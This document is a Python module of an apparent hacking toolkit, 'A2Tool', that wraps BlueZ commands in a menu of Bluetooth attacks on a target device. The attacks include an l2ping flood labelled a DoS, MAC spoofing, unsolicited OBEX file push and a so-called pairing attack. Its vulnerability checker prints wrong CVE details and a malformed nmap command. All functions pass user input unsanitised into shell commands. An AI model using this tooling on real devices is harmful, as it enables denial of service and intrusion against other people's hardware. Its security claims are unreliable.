#!/usr/bin/env python3
"""
A2Tool v4.0 - Bluetooth Hacking Tools Module (10 Tools)
Author: Ayush Rajdev & Anzar Iqbal
"""

import os, sys, subprocess, re, json, time
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except:
    class Fore: RED=GREEN=YELLOW=BLUE=MAGENTA=CYAN=WHITE='';RESET=''
    Style=Fore

R=Fore.RED; G=Fore.GREEN; Y=Fore.YELLOW; B=Fore.BLUE
M=Fore.MAGENTA; C=Fore.CYAN; W=Fore.WHITE; RS=Style.RESET_ALL

def _run(cmd, shell=True, timeout=30):
    try: return subprocess.check_output(cmd, shell=shell, stderr=subprocess.STDOUT, timeout=timeout).decode('utf-8', errors='ignore')
    except: return ''

def menu():
    while True:
        print(f"\n{C}╔══════════════════════════════════════════════════════════════╗{RS}")
        print(f"{C}║{W}               Bluetooth Hacking Tools                      {C}║{RS}")
        print(f"{C}╠══════════════════════════════════════════════════════════════╣{RS}")
        print(f"{C}║{W} [01]{R}  Bluetooth Device Scan                              {C}║{RS}")
        print(f"{C}║{W} [02]{R}  Bluetooth Service Discovery                        {C}║{RS}")
        print(f"{C}║{W} [03]{R}  Bluetooth Device Info                              {C}║{RS}")
        print(f"{C}║{W} [04]{R}  Bluetooth RFCOMM Connection                        {C}║{RS}")
        print(f"{C}║{W} [05]{R}  Bluetooth OBEX Push                                {C}║{RS}")
        print(f"{C}║{W} [06]{R}  Bluetooth MAC Spoofing                            {C}║{RS}")
        print(f"{C}║{W} [07]{R}  Bluetooth Pairing Attack                           {C}║{RS}")
        print(f"{C}║{W} [08]{R}  Bluetooth L2CAP Ping Flood                        {C}║{RS}")
        print(f"{C}║{W} [09]{R}  Bluetooth Beacon Tracking                          {C}║{RS}")
        print(f"{C}║{W} [10]{R}  Bluetooth Vulnerability Scanner                   {C}║{RS}")
        print(f"{C}║{W} [0]{R}   Back to Main Menu                                  {C}║{RS}")
        print(f"{C}╚══════════════════════════════════════════════════════════════╝{RS}")
        ch = input(f"\n{Y}  A2Tool[BT] » {RS}").strip()
        if ch == '0': break
        elif ch == '1': bt_scan()
        elif ch == '2': bt_service_discover()
        elif ch == '3': bt_device_info()
        elif ch == '4': bt_rfcomm()
        elif ch == '5': bt_obex()
        elif ch == '6': bt_mac_spoof()
        elif ch == '7': bt_pair_attack()
        elif ch == '8': bt_l2cap_ping()
        elif ch == '9': bt_beacon_track()
        elif ch == '10': bt_vuln_scan()
        else: print(f"{R}[!] Invalid option{RS}")

def bt_scan():
    print(f"\n{G}[+] Scanning for Bluetooth devices...{RS}")
    out = _run('hcitool scan 2>/dev/null || bluetoothctl scan on 2>/dev/null & sleep 5 && bluetoothctl devices 2>/dev/null')
    if out:
        print(f"{Y}{out}{RS}")
    else:
        print(f"{Y}[-] No Bluetooth adapter found or not supported on this platform{RS}")
        print(f"{Y}[!] On Linux: install bluez (apt install bluez){RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def bt_service_discover():
    addr = input(f"  {W}[?] Device MAC address: {RS}").strip()
    print(f"\n{G}[+] Discovering services on {addr}...{RS}")
    out = _run(f'sdptool browse {addr} 2>/dev/null || bt-service-discovery {addr}')
    print(f"{Y}{out or 'Service discovery not available'}{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def bt_device_info():
    addr = input(f"  {W}[?] Device MAC address: {RS}").strip()
    print(f"\n{G}[+] Getting info for {addr}...{RS}")
    out = _run(f'hcitool info {addr} 2>/dev/null')
    print(f"{Y}{out or 'Info not available'}{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def bt_rfcomm():
    addr = input(f"  {W}[?] Device MAC address: {RS}").strip()
    channel = input(f"  {W}[?] RFCOMM channel: {RS}").strip() or '1'
    print(f"\n{G}[+] Connecting to {addr} on channel {channel}...{RS}")
    os.system(f'rfcomm connect 0 {addr} {channel} 2>/dev/null &')
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def bt_obex():
    print(f"\n{Y}[!] OBEX Push - Send files via Bluetooth{RS}")
    addr = input(f"  {W}[?] Target device MAC: {RS}").strip()
    file_path = input(f"  {W}[?] File to send: {RS}").strip()
    print(f"{G}[+] Sending {file_path} to {addr}...{RS}")
    os.system(f'obexftp -b {addr} -p {file_path} 2>/dev/null')
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def bt_mac_spoof():
    print(f"\n{Y}[!] Bluetooth MAC Spoofing{RS}")
    iface = input(f"  {W}[?] Bluetooth interface (hci0): {RS}").strip() or 'hci0'
    new_mac = input(f"  {W}[?] New MAC address: {RS}").strip()
    if new_mac:
        os.system(f'hciconfig {iface} down && hciconfig {iface} address {new_mac} && hciconfig {iface} up')
        print(f"{G}[+] MAC changed!{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def bt_pair_attack():
    print(f"\n{Y}[!] Bluetooth Pairing Attack (BlueSmack){RS}")
    addr = input(f"  {W}[?] Target device MAC: {RS}").strip()
    print(f"{G}[+] Attempting pairing...{RS}")
    out = _run(f'bluetoothctl pair {addr} 2>/dev/null')
    print(f"{Y}{out[:500]}{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def bt_l2cap_ping():
    print(f"\n{Y}[!] L2CAP Ping Flood (Bluetooth DoS){RS}")
    addr = input(f"  {W}[?] Target device MAC: {RS}").strip()
    print(f"{G}[+] Sending L2CAP ping...{RS}")
    os.system(f'l2ping -f -s 1000 {addr} 2>/dev/null')
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def bt_beacon_track():
    print(f"\n{G}[+] Bluetooth Beacon Tracking{RS}")
    dur = input(f"  {W}[?] Duration (seconds): {RS}").strip() or '30'
    print(f"{Y}[!] Tracking for {dur}s...{RS}")
    out = _run(f'hcitool scan --flush --duration={dur} 2>/dev/null')
    print(f"{Y}{out or 'No beacons found'}{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def bt_vuln_scan():
    print(f"\n{G}[+] Bluetooth Vulnerability Scanner{RS}")
    addr = input(f"  {W}[?] Target device MAC: {RS}").strip()
    print(f"{W}Checking known vulnerabilities...{RS}")
    vulns = [
        ("BlueBorne (CVE-2017-0781)", "Check with nmap: nmap -sV --script bluetooth-vuln* {addr}"),
        ("BlueKeep (CVE-2020-26558)", "Check Bluetooth version < 5.2"),
        ("KNOB Attack (CVE-2019-9506)", "Weak encryption key negotiation"),
        ("BIAS Attack (CVE-2020-10135)", "BR/EDR impersonation attack"),
    ]
    for name, check in vulns:
        print(f"  {W}{name}:{RS}")
        print(f"    {Y}{check}{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")
